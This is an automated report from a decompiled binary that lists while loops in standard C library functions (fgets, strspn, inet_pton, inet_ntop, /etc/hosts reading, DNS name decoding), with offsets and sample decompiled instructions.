++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 65096 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v141 = getc_unlocked(); // 0x80579fd
=============================WHILE LOOPS ID : 266 @ __GI_strspn ====================================
++++++++ WHILE START : 65830 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 65875 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 268 @ inet_pton ====================================
++++++++ WHILE START : 66416 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 66655 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_pton4(v152, (int32_t)v153, v142) >= 1) {
=============================WHILE LOOPS ID : 270 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 67041 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 67383 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v182 = inet_ntop4((int32_t)v141, (int32_t)v155, v154);
		v179 = v138 + sprintf(v176, (int32_t)"%x");
		v182 = inet_ntop4((int32_t)v141, (int32_t)v155, v154);
		v179 = v138 + sprintf(v176, (int32_t)"%x");
		while (true) {
=============================WHILE LOOPS ID : 273 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68567 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68582 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v159 = __GI_strcasecmp(v154, v158, v157, v157); // 0x80585b2
=============================WHILE LOOPS ID : 274 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68584 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68597 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v141, v139, v137) != 0) {
		__GI_fclose((int16_t *)v139);
=============================WHILE LOOPS ID : 275 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68647 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68896 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		if (fgets(v141, v139, v137) != 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t v189 = fgets(v141, v139, v188); // 0x8058619
		v169 = __GI_fclose((int16_t *)v139);
		if (inet_pton(2, (char *)v192, (int32_t)v143, v138) >= 1) {
		while (true) {
		__GI_fclose((int16_t *)v139);
		__GI_fclose((int16_t *)v139);
=============================WHILE LOOPS ID : 279 @ __decode_dotted ====================================
++++++++ WHILE START : 70092 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 70158 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
